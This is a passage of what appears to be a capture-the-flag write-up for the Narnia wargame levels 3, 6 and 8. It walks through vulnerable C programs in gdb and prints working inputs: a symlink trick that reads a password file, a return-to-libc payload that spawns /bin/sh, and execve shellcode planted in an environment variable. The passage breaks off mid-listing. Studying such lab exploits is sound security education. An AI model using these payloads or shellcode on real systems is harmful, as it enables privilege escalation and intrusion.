</span><span class='line'>buf = "\370\370\377\267\364\237\374\267\371\234\367\267\245B\352\267h\370\377\277չ\350\267\364\237\374\267\214\230\004\b"
</span><span class='line'>
</span><span class='line'>As expected, ofile has been overwritten to /tmp/hack. However ifile is now AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hack so in order to read /etc/narnia_pass/narnia4, we need to create a directory AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp and symlink /etc/narnia_pass/narnia4 to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hack
</span><span class='line'>
</span><span class='line'>narnia3@melissa:/tmp/skojiman3$ mkdir -p AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp
</span><span class='line'>narnia3@melissa:/tmp/skojiman3$ ln -s /etc/narnia_pass/narnia4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hack
</span><span class='line'>
</span><span class='line'>Next we need to create the output file /tmp/hack that ofile points to
</span><span class='line'>
</span><span class='line'>narnia3@melissa:/tmp/skojiman3$ touch /tmp/hack
</span><span class='line'>narnia3@melissa:/tmp/skojiman3$ chmod 666 /tmp/hack
</span><span class='line'>narnia3@melissa:/tmp/skojiman3$ ls -l /tmp/hack
</span><span class='line'>-rw-rw-rw- 1 narnia3 narnia3 0 2012-11-24 22:58 /tmp/hack
</span><span class='line'>
</span><span class='line'>Finally, execute /narnia/narnia3 as follows:
</span><span class='line'>
</span><span class='line'>narnia3@melissa:/tmp/skojiman3$ /narnia/narnia3 `python -c 'print "A"*32 + "/tmp/hack"'`
</span><span class='line'>copied contents of AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/hack to a safer place... (/tmp/hack)
</span><span class='line'>narnia3@melissa:/tmp/skojiman3$ cat /tmp/hack
</span><span class='line'>thaenohtai
</span><span class='line'>��*������e���@�narnia3@melissa:/tmp/skojiman3$</span></code></pre></td></tr></table></div></figure>
</li>

<li>
Let&#8217;s see another example  <strong>Narnia6</strong>.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="k">extern</span> <span class="kt">char</span> <span class="o">**</span><span class="n">environ</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// tired of fixing values...</span>
</span><span class='line'><span class="c1">// - morla</span>
</span><span class='line'><span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">get_sp</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>       <span class="n">__asm__</span><span class="p">(</span><span class="s">&quot;movl %esp,%eax</span><span class="se">\n\t</span><span class="s">&quot;</span>
</span><span class='line'>               <span class="s">&quot;and $0xff000000, %eax&quot;</span>
</span><span class='line'>               <span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">b1</span><span class="p">[</span><span class="mi">8</span><span class="p">],</span> <span class="n">b2</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">int</span>  <span class="p">(</span><span class="o">*</span><span class="n">fp</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">=</span><span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="p">))</span><span class="o">&amp;</span><span class="n">puts</span><span class="p">,</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">!=</span><span class="mi">3</span><span class="p">){</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s b1 b2</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span> <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="cm">/* clear environ */</span>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>      <span class="n">memset</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="sc">&#39;\0&#39;</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">environ</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span>
</span><span class='line'>  <span class="cm">/* clear argz    */</span>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">3</span><span class="p">;</span> <span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>      <span class="n">memset</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="sc">&#39;\0&#39;</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="n">i</span><span class="p">]));</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">b1</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="n">b2</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
</span><span class='line'>  <span class="c1">//if(((unsigned long)fp &amp; 0xff000000) == 0xff000000)</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(((</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">fp</span> <span class="o">&amp;</span> <span class="mh">0xff000000</span><span class="p">)</span> <span class="o">==</span> <span class="n">get_sp</span><span class="p">())</span>
</span><span class='line'>      <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'>  <span class="n">fp</span><span class="p">(</span><span class="n">b1</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

Stack is not executable for this binary. This binary is an example of “return-to-libc” attack is a computer security attack usually starting with a buffer overflow in which a subroutine return address on a call stack is replaced by an address of a subroutine that is already present in the process’ executable memory, rendering the NX bit feature useless (if present) and ridding the attacker of the need to inject their own code.

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb -q narnia6
</span><span class='line'>Reading symbols from /home/bitvijays/narnia6...(no debugging symbols found)...done.
</span><span class='line'>gdb-peda$ checksec 
</span><span class='line'>CANARY    : disabled
</span><span class='line'>FORTIFY   : disabled
</span><span class='line'>NX        : ENABLED
</span><span class='line'>PIE       : disabled
</span><span class='line'>RELRO     : disabled
</span><span class='line'>gdb-peda$ </span></code></pre></td></tr></table></div></figure>
Let&#8217;s compile the source on the local and check what happens:
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gcc -m32 -ggdb -fno-stack-protector -Wall narnia6.c -o narnia61</span></code></pre></td></tr></table></div></figure>
If you see carefully, we passed A*8 + BBBB + &#8221; &#8221; + &#8220;C&#8221;*8 + DDDD, which resulted in
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb -q ./narnia61
</span><span class='line'>gdb-peda$ pdisass main
</span><span class='line'>Dump of assembler code for function main:
</span><span class='line'>   0x080486d2 &lt;+330&gt;:   call   0x8048450 &lt;exit@plt&gt;
</span><span class='line'>   0x080486d7 &lt;+335&gt;:   lea    eax,[esp+0x20]
</span><span class='line'>   0x080486db &lt;+339&gt;:   mov    DWORD PTR [esp],eax
</span><span class='line'>   0x080486de &lt;+342&gt;:   mov    eax,DWORD PTR [esp+0x28]
</span><span class='line'>   0x080486e2 &lt;+346&gt;:   call   eax
</span><span class='line'>   0x080486e4 &lt;+348&gt;:   mov    DWORD PTR [esp],0x1
</span><span class='line'>   0x080486eb &lt;+355&gt;:   call   0x8048450 &lt;exit@plt&gt;
</span><span class='line'>End of assembler dump.
</span><span class='line'>gdb-peda$ br *main+346
</span><span class='line'>Breakpoint 1 at 0x80486e2: file narnia6.c, line 48.
</span><span class='line'>gdb-peda$ run `python -c 'print "A"*8 + "BBBB" + " " + "C"*8 + "DDDD"'`
</span><span class='line'>[-------------------------------------code-------------------------------------]
</span><span class='line'>   0x80486d7 &lt;main+335&gt;:    lea    eax,[esp+0x20]
</span><span class='line'>   0x80486db &lt;main+339&gt;:    mov    DWORD PTR [esp],eax
</span><span class='line'>   0x80486de &lt;main+342&gt;:    mov    eax,DWORD PTR [esp+0x28]
</span><span class='line'>=&gt; 0x80486e2 &lt;main+346&gt;: call   eax
</span><span class='line'>   0x80486e4 &lt;main+348&gt;:    mov    DWORD PTR [esp],0x1
</span><span class='line'>   0x80486eb &lt;main+355&gt;:    call   0x8048450 &lt;exit@plt&gt;
</span><span class='line'>   0x80486f0 &lt;__libc_csu_fini&gt;: push   ebp
</span><span class='line'>   0x80486f1 &lt;__libc_csu_fini+1&gt;:   mov    ebp,esp
</span><span class='line'>Guessed arguments:
</span><span class='line'>arg[0]: 0xffffd380 ("DDDD")
</span><span class='line'>Breakpoint 1, 0x080486e2 in main (argc=0x3, argv=0xffffd444) at narnia6.c:48
</span><span class='line'>48        fp(b1);
</span><span class='line'>gdb-peda$ p b1
</span><span class='line'>$1 = "DDDD\000AAA"
</span><span class='line'>gdb-peda$ p b2
</span><span class='line'>$2 = "CCCCCCCC"
</span><span class='line'>gdb-peda$ p puts
</span><span class='line'>$3 = {&lt;text variable, no debug info&gt;} 0xf7eb3360 &lt;puts&gt;
</span><span class='line'>gdb-peda$ p system
</span><span class='line'>$4 = {&lt;text variable, no debug info&gt;} 0xf7e8bc30 &lt;system&gt;
</span><span class='line'>gdb-peda$ p &b1
</span><span class='line'>$5 = (char (*)[8]) 0xffffd380
</span><span class='line'>gdb-peda$ x/50xw 0xffffd350
</span><span class='line'>0xffffd360:   0xffffd380  0xffffd5df  0x0000003b  0x0804874b
</span><span class='line'>0xffffd370:   0x00000003  0xffffd444  0x43434343  0x43434343
</span><span class='line'>0xffffd380:   0x44444444  0x41414100  0x42424242  0x00000000
</span><span class='line'>0xffffd390:   0x08048700  0xf7fb0ff4  0xffffd418  0xf7e66e46
</span><span class='line'>0xffffd3a0:   0x00000003  0xffffd444  0xffffd454  0xf7fde860
</span><span class='line'>gdb-peda$ p fp
</span><span class='line'>$6 = (int (*)(char *)) 0x42424242
</span><span class='line'>gdb-peda$ p &fp
</span><span class='line'>$7 = (int (**)(char *)) 0xffffd388
</span><span class='line'>gdb-peda$ p $fp
</span><span class='line'>$8 = (void *) 0xffffd398</span></code></pre></td></tr></table></div></figure>
The address of fp &#8220;p &fp&#8221; is 0xffffd3888 which has a value of (&#8220;p fp&#8221;) 0x42424242. As previously the stack is NoteXecutable, but stdlib.h is included in the C Program. Stdlib.h includes system call which has an address of (&#8220;p system&#8221;) 0xf7e8bc30. Further DDDD overwrites AAAA with the Null byte.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia6@melinda:/narnia$ ./narnia6 `python -c 'print "A"*8 + "\x40\x1c\xe6\xf7" + " " + "C"*8 + "/bin/sh"'`
</span><span class='line'>$ cat /etc/narnia_pass/narnia7</span></code></pre></td></tr></table></div></figure>
</li>

<li>Let&#8217;s see another example where we have to use a environment variable to invoke a shell <strong>Narnia8</strong>.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="c1">// gcc&#39;s variable reordering fucked things up</span>
</span><span class='line'><span class="c1">// to keep the level in its old style i am </span>
</span><span class='line'><span class="c1">// making &quot;i&quot; global unti i find a fix </span>
</span><span class='line'><span class="c1">// -morla </span>
</span><span class='line'><span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">func</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">b</span><span class="p">){</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">blah</span><span class="o">=</span><span class="n">b</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">bok</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
</span><span class='line'>  <span class="c1">//int i=0;</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">memset</span><span class="p">(</span><span class="n">bok</span><span class="p">,</span> <span class="sc">&#39;\0&#39;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">bok</span><span class="p">));</span>
</span><span class='line'>  <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">blah</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
</span><span class='line'>      <span class="n">bok</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">=</span><span class="n">blah</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="n">bok</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>      <span class="n">func</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s argument</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>

Let&#8217;s see what is happening here: for loop in function func copies data from blah to bok character array until a null character is found. Let&#8217;s see how the stack would look like
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;bok character array&gt;&lt;blah pointer&gt;&lt;fp&gt;&lt;ret&gt;&lt;pointer b&gt;</span></code></pre></td></tr></table></div></figure>
Let&#8217;s confirm this by using gdb? We put an breakpoint on printf function in the func function.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0xffffd670:  0x08048580  0xffffd688  0x00000014  0xf7e54f53
</span><span class='line'>0xffffd680:   0x00000000  0x00ca0000  0x41414141  0x41414141
</span><span class='line'>0xffffd690:   0x41414141  0x41414141  0x00414141  0xffffd8b1
</span><span class='line'>0xffffd6a0:   0x00000002  0xffffd764  0xffffd6c8  0x080484cd
</span><span class='line'>0xffffd6b0:   0xffffd8b1  0xf7ffd000  0x080484fb  0xf7fca000</span></code></pre></td></tr></table></div></figure>
Address 0xffffd689 marks the start of the character buffer bok. I entered 19 A so it&#8217;s 0x41 19 times followed by null 0x00. Followed by that is 0xffffd8b1 (Value of Blah pointer). Followed by fp 12 bytes <0x00000002 0xffffd764 0xffffd6c8>. Followed by 0x080484cd which is the return address
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/s 0x080484cd
</span><span class='line'>0x80484cd &lt;main+31&gt;:    "\353\025\213E\f\213"</span></code></pre></td></tr></table></div></figure>
followed by pointer b (0xffffd8b1).
Let&#8217;s see what&#8217;s at location 0xffffd8b1
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/20wx 0xffffd8b1
</span><span class='line'>0xffffd8b1:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd8c1:   0x00414141  0x5f474458  0x53534553  0x5f4e4f49</span></code></pre></td></tr></table></div></figure>

Let&#8217;s see what happens when we try to enter more than the 19 character (buffer size of bok - 1 byte (for null character))
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia8@melinda:/narnia$ ./narnia8 `python -c 'print "A"*20'`
</span><span class='line'>AAAAAAAAAAAAAAAAAAAA����
</span><span class='line'>narnia8@melinda:/narnia$ ./narnia8 `python -c 'print "A"*20'` | hexdump 
</span><span class='line'>0000000 4141 4141 4141 4141 4141 4141 4141 4141
</span><span class='line'>0000010 4141 4141 d8bf ffff 0a02               
</span><span class='line'>000001a</span></code></pre></td></tr></table></div></figure>
As expected, we get A followed by some garbage. which is the address where blah is pointing.

We know that we can overwrite the RET address by 
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># `python -c 'print "A"*20 + "\x90\x90\x90\x90" + "A"*12 + "BBBB"'`</span></code></pre></td></tr></table></div></figure>
Let&#8217;s see what happens when we do this. After copying 20 A it copies \x90 and makes blah pointer from 0xffffd8bf to 0xffffd890. Because of the for loop
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>for(i=0; blah[i] != '\0'; i++)</span></code></pre></td></tr></table></div></figure>
It now copies the character from 0xffffd890 reference i.e 0xffffd890 + i value. Suppose it copied the character 0x41. The address becomes 0xffff4190 and now for loop searches from that address until a null character is found.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/20xw $esp
</span><span class='line'>0xffffd660:   0xffffd678  0x00000000  0x00000014  0xf7e54f53
</span><span class='line'>0xffffd670:   0x00000000  0x00ca0000  0x41414141  0x41414141
</span><span class='line'>0xffffd680:   0x41414141  0x41414141  0x41414141  0xffffd890
</span><span class='line'>0xffffd690:   0x00000002  0xffffd754  0xffffd6b8  0x080484cd
</span><span class='line'>0xffffd6a0:   0xffffd89c  0xf7ffd000  0x080484fb  0xf7fca000
</span><span class='line'>
</span><span class='line'>(gdb) x/10xw 0xffffd890
</span><span class='line'>0xffffd890:   0x2f61696e  0x6e72616e  0x00386169  0x41414141
</span><span class='line'>0xffffd8a0:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd8b0:   0x90909090  0x41414141
</span><span class='line'>
</span><span class='line'>(gdb) x/20xw $esp
</span><span class='line'>0xffffd660:   0x08048580  0xffffd678  0x00000014  0xf7e54f53
</span><span class='line'>0xffffd670:   0x00000000  0x00ca0000  0x41414141  0x41414141
</span><span class='line'>0xffffd680:   0x41414141  0x41414141  0x41414141  0xffff4190
</span><span class='line'>0xffffd690:   0x00000002  0xffffd754  0xffffd6b8  0x080484cd
</span><span class='line'>0xffffd6a0:   0xffffd89c  0xf7ffd000  0x080484fb  0xf7fca000
</span><span class='line'>
</span><span class='line'>(gdb) x/10xw 0xffff4190
</span><span class='line'>0xffff4190:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0xffff41a0:   0x00000000  0x00000000  0x00000000  0x00000000
</span><span class='line'>0xffff41b0:   0x00000000  0x00000000</span></code></pre></td></tr></table></div></figure>

If we can somehow keep/change the blah pointer back to it&#8217;s original value we may overwrite the RET pointer (after 12 bytes). Let&#8217;s see how 0xffffd89c looks when is used
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>`python -c 'print "A"*20 + "\x90\x90\x90\x90" + "A"*12 + "BBBB"'`</span></code></pre></td></tr></table></div></figure>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/30xw 0xffffd89c
</span><span class='line'>0xffffd89c:   0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd8ac:   0x41414141  0x90909090  0x41414141  0x41414141
</span><span class='line'>0xffffd8bc:   0x41414141  0x42424242  0x47445800  0x5345535f</span></code></pre></td></tr></table></div></figure>

When we used the below with the address, we were able to overwrite the RET by BBBB. Now, we control the EIP :)
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) run `python -c 'print "A"*20 + "\x9c\xd8\xff\xff" + "A"*12 + "BBBB"'`
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>(gdb) x/20xw $esp
</span><span class='line'>0xffffd660:   0x08048580  0xffffd678  0x00000014  0xf7e54f53
</span><span class='line'>0xffffd670:   0x00000000  0x00ca0000  0x41414141  0x41414141
</span><span class='line'>0xffffd680:   0x41414141  0x41414141  0x41414141  0xffffd89c
</span><span class='line'>0xffffd690:   0x41414141  0x41414141  0x41414141  0x42424242</span></code></pre></td></tr></table></div></figure>

Let&#8217;s export a shellcode using a environment variable check it&#8217;s address on the stack and redirect the flow of our code to it. Notice the number of NOPs we have put for easy identification plus reachability.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>export EGG=`python -c 'print "\x90"*90 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`</span></code></pre></td></tr></table></div></figure>

Searching our environment variable we get it at address 0xffffd8d4.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
